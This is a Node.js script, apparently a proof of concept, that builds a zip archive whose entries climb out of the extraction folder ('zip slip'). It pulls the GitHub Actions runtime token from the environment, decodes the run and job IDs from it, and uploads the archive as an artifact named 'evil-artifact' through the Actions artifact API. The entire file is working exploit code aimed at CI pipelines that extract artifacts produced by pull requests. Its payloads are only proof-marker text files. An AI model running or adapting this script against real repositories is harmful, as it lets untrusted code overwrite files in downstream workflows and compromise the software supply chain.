const {execSync}=require('child_process');
const fs=require('fs');
// 1. craft zip with traversal entries (runner has python3)
execSync(`python3 - <<'PYEOF'
import zipfile
with zipfile.ZipFile('evil.zip','w') as z:
    z.writestr('../ZIPSLIP-PROOF.txt','POISONED-BY-PR-ARTIFACT')
    z.writestr('../../ZIPSLIP-PROOF-2.txt','POISONED-LEVEL2')
    z.writestr('../../../ZIPSLIP-PROOF-3.txt','POISONED-LEVEL3')
PYEOF`,{stdio:'inherit'});
const zip=fs.readFileSync('evil.zip');
console.log('zip bytes:',zip.length);
// 2. backend ids from token scp
const tok=process.env.ACTIONS_RUNTIME_TOKEN;
const scp=JSON.parse(Buffer.from(tok.split('.')[1],'base64url').toString()).scp;
const run=scp.split(' ').find(s=>s.startsWith('Actions.Results:')).split(':')[1];
const job=scp.split(' ').find(s=>s.startsWith('Actions.Results:')).split(':')[2];
const base=(process.env.ACTIONS_RESULTS_URL||'https://results-receiver.actions.githubusercontent.com/').replace(/\/$/,'')+'/twirp/github.actions.results.api.v1.ArtifactService/';
const call=async(m,b)=>{const r=await fetch(base+m,{method:'POST',headers:{Authorization:'Bearer '+tok,'Content-Type':'application/json'},body:JSON.stringify(b)});return r.json();};
(async()=>{
  const cr=await call('CreateArtifact',{workflowRunBackendId:run,workflowJobRunBackendId:job,name:'evil-artifact',version:1});
  console.log('create ok:',cr.ok);
  if(!cr.ok||!cr.signed_upload_url){console.log(JSON.stringify(cr));return;}
  const up=execSync(`curl -s -o /dev/null -w '%{http_code}' -X PUT "${cr.signed_upload_url}" -H 'x-ms-blob-type: BlockBlob' --data-binary @evil.zip`,{encoding:'utf8'});
  console.log('blob upload:',up);
  const fin=await call('FinalizeArtifact',{workflowRunBackendId:run,workflowJobRunBackendId:job,name:'evil-artifact',size:String(zip.length)});
  console.log('finalize:',JSON.stringify(fin));
})();
